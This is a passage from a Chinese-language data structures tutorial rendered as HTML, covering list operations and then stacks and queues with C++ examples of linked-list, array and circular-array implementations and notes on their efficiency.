class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>    count += nums[i];<br>&#125;<br><br><span class="hljs-comment">/* 直接遍历列表元素 */</span><br>count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>    count += num;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="5-拼接列表"><a href="#5-拼接列表" class="headerlink" title="5. 拼接列表"></a>5. 拼接列表</h5><p>给定一个新列表 <code>nums1</code> ，我们可以将其拼接到原列表的尾部。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 拼接两个列表 */</span><br>vector&lt;<span class="hljs-type">int</span>&gt; nums1 = &#123; <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span> &#125;;<br><span class="hljs-comment">// 将列表 nums1 拼接到 nums 之后</span><br>nums.<span class="hljs-built_in">insert</span>(nums.<span class="hljs-built_in">end</span>(), nums<span class="hljs-number">1.</span><span class="hljs-built_in">begin</span>(), nums<span class="hljs-number">1.</span><span class="hljs-built_in">end</span>());<br></code></pre></td></tr></table></figure><h5 id="6-排序列表"><a href="#6-排序列表" class="headerlink" title="6.  排序列表"></a>6.  排序列表</h5><p>完成列表排序后，我们便可以使用在数组类算法题中经常考查的“二分查找”和“双指针”算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 排序列表 */</span><br><span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 排序后，列表元素从小到大排列</span><br></code></pre></td></tr></table></figure><h3 id="第5章-栈与队列"><a href="#第5章-栈与队列" class="headerlink" title="第5章 栈与队列"></a>第5章 栈与队列</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><h5 id="栈的常用操作"><a href="#栈的常用操作" class="headerlink" title="栈的常用操作"></a>栈的常用操作</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化栈 */</span><br>stack&lt;<span class="hljs-type">int</span>&gt; stack;<br><br><span class="hljs-comment">/* 元素入栈 */</span><br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 访问栈顶元素 */</span><br><span class="hljs-type">int</span> top = stack.<span class="hljs-built_in">top</span>();<br><br><span class="hljs-comment">/* 元素出栈 */</span><br>stack.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 无返回值</span><br><br><span class="hljs-comment">/* 获取栈的长度 */</span><br><span class="hljs-type">int</span> size = stack.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断是否为空 */</span><br><span class="hljs-type">bool</span> empty = stack.<span class="hljs-built_in">empty</span>();<br></code></pre></td></tr></table></figure><h5 id="栈的实现"><a href="#栈的实现" class="headerlink" title="栈的实现"></a>栈的实现</h5><p>为了深入了解栈的运行机制，我们来尝试自己实现一个栈类。</p><p>栈遵循先入后出的原则，因此我们只能在栈顶添加或删除元素。然而，数组和链表都可以在任意位置添加和删除元素，<strong>因此栈可以视为一种受限制的数组或链表</strong>。换句话说，我们可以“屏蔽”数组或链表的部分无关操作，使其对外表现的逻辑符合栈的特性。</p><ol><li>基于链表的实现：</li></ol><p>使用链表实现栈时，我们可以将链表的头节点视为栈顶，尾节点视为栈底。</p><p>如图所示，对于入栈操作，我们只需将元素插入链表头部，这种节点插入方法被称为“头插法”。而对于出栈操作，只需将头节点从链表中删除即可。</p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/stack.assets/linkedlist_stack_step1.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/stack.assets/linkedlist_stack_step2_push.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/stack.assets/linkedlist_stack_step3_pop.png" srcset="/img/loading.gif" lazyload></p><p>以下是基于链表实现栈的示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于链表实现的栈 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedListStack</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    ListNode *stackTop; <span class="hljs-comment">// 将头节点作为栈顶</span><br>    <span class="hljs-type">int</span> stkSize;        <span class="hljs-comment">// 栈的长度</span><br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LinkedListStack</span>() &#123;<br>        stackTop = <span class="hljs-literal">nullptr</span>;<br>        stkSize = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    ~<span class="hljs-built_in">LinkedListStack</span>() &#123;<br>        <span class="hljs-comment">// 遍历链表删除节点，释放内存</span><br>        <span class="hljs-built_in">freeMemoryLinkedList</span>(stackTop);<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取栈的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stkSize;<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断栈是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        ListNode *node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(num);<br>        node-&gt;next = stackTop;<br>        stackTop = node;<br>        stkSize++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 出栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">top</span>();<br>        ListNode *tmp = stackTop;<br>        stackTop = stackTop-&gt;next;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">delete</span> tmp;<br>        stkSize--;<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问栈顶元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;栈为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> stackTop-&gt;val;<br>    &#125;<br><br>    <span class="hljs-comment">/* 将 List 转化为 Array 并返回 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        ListNode *node = stackTop;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(size())</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = res.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            res[i] = node-&gt;val;<br>            node = node-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>基于数组的实现：</li></ol><p>使用数组实现栈时，我们可以将数组的尾部作为栈顶。入栈与出栈操作分别对应在数组尾部添加元素与删除元素。由于入栈的元素可能会源源不断地增加，因此我们可以使用动态数组，这样就无须自行处理数组扩容问题。以下为示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于数组实现的栈 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; stack;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/* 获取栈的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">size</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断栈是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        stack.<span class="hljs-built_in">push_back</span>(num);<br>    &#125;<br><br>    <span class="hljs-comment">/* 出栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">top</span>();<br>        stack.<span class="hljs-built_in">pop_back</span>();<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问栈顶元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;栈为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">back</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 返回 Vector */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="时间效率"><a href="#时间效率" class="headerlink" title="时间效率"></a>时间效率</h5><p>在基于数组的实现中，入栈和出栈操作都在预先分配好的连续内存中进行，具有很好的缓存本地性，因此效率较高。然而，如果入栈时超出数组容量，会触发扩容机制，导致该次入栈操作的时间复杂度变为$O(n)$。</p><p>在基于链表的实现中，链表的扩容非常灵活，不存在上述数组扩容时效率降低的问题。但是，入栈操作需要初始化节点对象并修改指针，因此效率相对较低。不过，如果入栈元素本身就是节点对象，那么可以省去初始化步骤，从而提高效率。</p><p>综上所述，当入栈与出栈操作的元素是基本数据类型时，例如 <code>int</code> 或 <code>double</code> ，我们可以得出以下结论。</p><ul><li>基于数组实现的栈在触发扩容时效率会降低，但由于扩容是低频操作，因此平均效率更高。</li><li>基于链表实现的栈可以提供更加稳定的效率表现。</li></ul><h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><h5 id="队列的常用操作"><a href="#队列的常用操作" class="headerlink" title="队列的常用操作"></a>队列的常用操作</h5><p>我们可以直接使用编程语言中现成的队列类：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化队列 */</span><br>queue&lt;<span class="hljs-type">int</span>&gt; queue;<br><br><span class="hljs-comment">/* 元素入队 */</span><br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 访问队首元素 */</span><br><span class="hljs-type">int</span> front = queue.<span class="hljs-built_in">front</span>();<br><br><span class="hljs-comment">/* 元素出队 */</span><br>queue.<span class="hljs-built_in">pop</span>();<br><br><span class="hljs-comment">/* 获取队列的长度 */</span><br><span class="hljs-type">int</span> size = queue.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断队列是否为空 */</span><br><span class="hljs-type">bool</span> empty = queue.<span class="hljs-built_in">empty</span>();<br></code></pre></td></tr></table></figure><h5 id="队列实现"><a href="#队列实现" class="headerlink" title="队列实现"></a>队列实现</h5><p>为了实现队列，我们需要一种数据结构，可以在一端添加元素，并在另一端删除元素，链表和数组都符合要求。</p><ol><li>基于链表的实现：</li></ol><p>我们可以将链表的“头节点”和“尾节点”分别视为“队首”和“队尾”，规定队尾仅可添加节点，队首仅可删除节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于链表实现的队列 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedListQueue</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    ListNode *front, *rear; <span class="hljs-comment">// 头节点 front ，尾节点 rear</span><br>    <span class="hljs-type">int</span> queSize;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LinkedListQueue</span>() &#123;<br>        front = <span class="hljs-literal">nullptr</span>;<br>        rear = <span class="hljs-literal">nullptr</span>;<br>        queSize = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    ~<span class="hljs-built_in">LinkedListQueue</span>() &#123;<br>        <span class="hljs-comment">// 遍历链表删除节点，释放内存</span><br>        <span class="hljs-built_in">freeMemoryLinkedList</span>(front);<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取队列的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queSize;<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断队列是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queSize == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入队 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-comment">// 在尾节点后添加 num</span><br>        ListNode *node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(num);<br>        <span class="hljs-comment">// 如果队列为空，则令头、尾节点都指向该节点</span><br>        <span class="hljs-keyword">if</span> (front == <span class="hljs-literal">nullptr</span>) &#123;<br>            front = node;<br>            rear = node;<br>        &#125;<br>        <span class="hljs-comment">// 如果队列不为空，则将该节点添加到尾节点后</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            rear-&gt;next = node;<br>            rear = node;<br>        &#125;<br>        queSize++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 出队 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">peek</span>();<br>        <span class="hljs-comment">// 删除头节点</span><br>        ListNode *tmp = front;<br>        front = front-&gt;next;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">delete</span> tmp;<br>        queSize--;<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问队首元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;队列为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> front-&gt;val;<br>    &#125;<br><br>    <span class="hljs-comment">/* 将链表转化为 Vector 并返回 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        ListNode *node = front;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(size())</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; res.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            res[i] = node-&gt;val;<br>            node = node-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>基于数组的实现：</li></ol><p>在数组中删除首元素的时间复杂度为$O(n)$，这会导致出队操作效率较低。然而，我们可以采用以下巧妙方法来避免这个问题。</p><p>我们可以使用一个变量 <code>front</code> 指向队首元素的索引，并维护一个变量 <code>size</code> 用于记录队列长度。定义 <code>rear = front + size</code> ，这个公式计算出的 <code>rear</code> 指向队尾元素之后的下一个位置。</p><p>基于此设计，**数组中包含元素的有效区间为 <code>[front, rear - 1]</code>**，各种操作的实现方法如图所示。</p><ul><li>入队操作：将输入元素赋值给 <code>rear</code> 索引处，并将 <code>size</code> 增加 1 。</li><li>出队操作：只需将 <code>front</code> 增加 1 ，并将 <code>size</code> 减少 1 。</li></ul><p>可以看到，入队和出队操作都只需进行一次操作，时间复杂度均为$O(1)$。</p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/queue.assets/array_queue_step1.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/queue.assets/array_queue_step2_push.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/queue.assets/array_queue_step3_pop.png" srcset="/img/loading.gif" lazyload></p><p>你可能会发现一个问题：在不断进行入队和出队的过程中，<code>front</code> 和 <code>rear</code> 都在向右移动，<strong>当它们到达数组尾部时就无法继续移动了</strong>。为了解决此问题，我们可以将数组视为首尾相接的“环形数组”。</p><p>对于环形数组，我们需要让 <code>front</code> 或 <code>rear</code> 在越过数组尾部时，直接回到数组头部继续遍历。这种周期性规律可以通过“取余操作”来实现，代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于环形数组实现的队列 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayQueue</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> *nums;       <span class="hljs-comment">// 用于存储队列元素的数组</span><br>    <span class="hljs-type">int</span> front;       <span class="hljs-comment">// 队首指针，指向队首元素</span><br>    <span class="hljs-type">int</span> queSize;     <span class="hljs-comment">// 队列长度</span><br>    <span class="hljs-type">int</span> queCapacity; <span class="hljs-comment">// 队列容量</span><br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">ArrayQueue</span>(<span class="hljs-type">int</span> capacity) &#123;<br>        <span class="hljs-comment">// 初始化数组</span><br>        nums = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[capacity];<br>        queCapacity = capacity;<br>        front = queSize = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    ~<span class="hljs-built_in">ArrayQueue</span>() &#123;<br>        <span class="hljs-keyword">delete</span>[] nums;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取队列的容量 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">capacity</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queCapacity;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取队列的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queSize;<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断队列是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入队 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (queSize == queCapacity) &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;队列已满&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 计算队尾指针，指向队尾索引 + 1</span><br>        <span class="hljs-comment">// 通过取余操作实现 rear 越过数组尾部后回到头部</span><br>        <span class="hljs-type">int</span> rear = (front + queSize) % queCapacity;<br>        <span class="hljs-comment">// 将 num 添加至队尾</span><br>        nums[rear] = num;<br>        queSize++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 出队 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">peek</span>();<br>        <span class="hljs-comment">// 队首指针向后移动一位，若越过尾部，则返回到数组头部</span><br>        front = (front + <span class="hljs-number">1</span>) % queCapacity;<br>        queSize--;<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问队首元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;队列为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> nums[front];<br>    &#125;<br><br>    <span class="hljs-comment">/* 将数组转化为 Vector 并返回 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 仅转换有效长度范围内的列表元素</span><br>        <span class="hljs-function">vector&lt;<span 